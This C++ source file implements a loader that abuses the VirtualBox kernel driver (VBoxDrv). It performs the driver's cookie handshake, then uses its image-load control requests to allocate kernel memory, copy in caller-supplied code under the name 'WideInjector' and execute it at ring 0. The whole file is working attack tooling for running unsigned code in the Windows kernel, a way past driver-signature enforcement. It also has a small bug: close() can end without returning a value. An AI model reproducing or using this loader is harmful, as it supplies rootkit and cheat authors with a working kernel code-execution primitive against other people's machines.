#include "includes.h"

bool IVBox::open( )
{
    if ( m_hDriver != INVALID_HANDLE_VALUE )
        return true;

    m_hDriver = CreateFileW( L"\\\\.\\VBoxDrv",
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
    );

	return m_hDriver != INVALID_HANDLE_VALUE;
}

bool IVBox::close( )
{
    if ( m_hDriver == INVALID_HANDLE_VALUE )
        return true;

	CloseHandle( m_hDriver );

    m_hDriver = INVALID_HANDLE_VALUE;
}

bool IVBox::begin_session( )
{
    ZeroMemory( &m_header, sizeof( m_header ) );
    m_header.cookie = SUP_INITIAL_COOKIE;
    m_header.flags = SUP_DEFAULT_FLAGS;

    SUP_COOKIE cookie;
    ZeroMemory( &cookie, sizeof( cookie ) );

    memcpy( &cookie.header, &m_header, sizeof( m_header ) );

    cookie.header.input_size = sizeof( cookie.header ) + sizeof( cookie.in );
    cookie.header.output_size = sizeof( cookie.header ) + sizeof( cookie.out );

    cookie.in.requested_version = 0;  // ignored parameter???
    cookie.in.min_version = 0x00070002;
    memcpy( cookie.in.magic_word, "The Magic Word!", sizeof( "The Magic Word!" ) );

    DWORD returned_bytes;
    if ( !DeviceIoControl( m_hDriver, SUP_IOCTL_COOKIE, &cookie, sizeof( cookie.header ) + sizeof( cookie.in ), &cookie,
                           sizeof( cookie.header ) + sizeof( cookie.out ), &returned_bytes, nullptr ) )
        return false;

    m_header.cookie = cookie.out.cookie;
    m_header.session_cookie = cookie.out.session_cookie;

    return true;
}

uintptr_t IVBox::allocate_ldr( size_t ldr_size )
{
    SUP_LDR_OPEN ldr_load;
    ZeroMemory( &ldr_load, sizeof( ldr_load ) );

    memcpy( &ldr_load.header, &m_header, sizeof( m_header ) );

    ldr_load.header.input_size = sizeof( ldr_load.header ) + sizeof( ldr_load.in );
    ldr_load.header.output_size = sizeof( ldr_load.header ) + sizeof( ldr_load.out );

    ldr_load.in.image_size = ldr_size;
    memcpy( &ldr_load.in.image_name, "WideInjector", sizeof( "WideInjector" ) );

    DWORD returned_bytes;
    if ( !DeviceIoControl( m_hDriver, SUP_IOCTL_LDR_OPEN, &ldr_load, sizeof( ldr_load.header ) + sizeof( ldr_load.in ), &ldr_load,
                           sizeof( ldr_load.header ) + sizeof( ldr_load.out ), &returned_bytes, nullptr ) )
        return NULL;

    return ldr_load.out.image_base;
}

bool IVBox::load_ldr( uintptr_t ldr_base, uintptr_t* ptr_data, size_t data_size )
{
    auto ptr_ldr_load = rc<SUP_LDR_LOAD*>( 
        VirtualAlloc( nullptr, sizeof( SUP_LDR_LOAD ) + data_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) );
    if ( !ptr_ldr_load )
        return false;

    memcpy( &ptr_ldr_load->header, &m_header, sizeof( m_header ) );

    ptr_ldr_load->header.input_size = sizeof( ptr_ldr_load->header ) + sizeof( ptr_ldr_load->in ) + data_size - sizeof( ptr_ldr_load->in.image_data );
    ptr_ldr_load->header.output_size = sizeof( ptr_ldr_load->header );

    ptr_ldr_load->in.image_base = ldr_base;
    ptr_ldr_load->in.image_size = data_size;
    ptr_ldr_load->in.entrypoint_type = ENUM_SUP_LDR_LOAD_EP_TYPE::SUP_LDR_LOAD_EP_VMMR0;
    ptr_ldr_load->in.entry.cpl0.module_handle_cpl0 = 0x69000;
    ptr_ldr_load->in.entry.cpl0.module_entry_cpl0 = ptr_ldr_load->in.entry.cpl0.module_entry_ex_cpl0 = ptr_ldr_load->in.entry.cpl0.module_entry_fast_cpl0 = ldr_base;

    memcpy( &ptr_ldr_load->in.image_data, ptr_data, data_size );

    DWORD returned_bytes;

#pragma warning( suppress : 6385 6386 )
    auto status = DeviceIoControl( m_hDriver, SUP_IOCTL_LDR_LOAD, ptr_ldr_load, sizeof( ptr_ldr_load->header ) + sizeof( ptr_ldr_load->in ) + data_size - sizeof( ptr_ldr_load->in.image_data ),
                            ptr_ldr_load, sizeof( ptr_ldr_load->header ), &returned_bytes, nullptr );

    VirtualFree( ptr_ldr_load, NULL, MEM_RELEASE );

    return status;
}

bool IVBox::set_vm_for_fast( )
{
    SUP_SET_VM_FOR_FAST vm_fast;
    ZeroMemory( &vm_fast, sizeof( vm_fast ) );

    memcpy( &vm_fast.header, &m_header, sizeof( m_header ) );

    vm_fast.header.input_size = sizeof( vm_fast.header ) + sizeof( vm_fast.in );
    vm_fast.header.output_size = sizeof( vm_fast.header );

    vm_fast.in.vm_handle_cpl0 = 0x69000;

    DWORD returned_bytes;
    return DeviceIoControl( m_hDriver, SUP_IOCTL_SET_VM_FOR_FAST, &vm_fast, sizeof( vm_fast.header ) + sizeof( vm_fast.in ),
                            &vm_fast, sizeof( vm_fast.header ), &returned_bytes, nullptr );
}

NTSTATUS IVBox::run_entry( )
{
    uintptr_t status = 0;

    DWORD returned_bytes;
    DeviceIoControl( m_hDriver, SUP_IOCTL_FAST_DO_NOP, nullptr, NULL,
                     &status, sizeof( status ), &returned_bytes, nullptr );

    return status;
}

bool IVBox::free_ldr( uintptr_t ldr_base )
{
    SUP_LDR_FREE ldr_free;
    ZeroMemory( &ldr_free, sizeof( ldr_free ) );

    memcpy( &ldr_free.header, &m_header, sizeof( m_header ) );

    ldr_free.header.input_size = sizeof( ldr_free.header ) + sizeof( ldr_free.in );
    ldr_free.header.output_size = sizeof( ldr_free.header );

    ldr_free.in.cpl0_image_base = ldr_base;

    DWORD returned_bytes;
    return DeviceIoControl( m_hDriver, SUP_IOCTL_LDR_FREE, &ldr_free, sizeof( ldr_free.header ) + sizeof( ldr_free.in ),
                            &ldr_free, sizeof( ldr_free.header ), &returned_bytes, nullptr );
}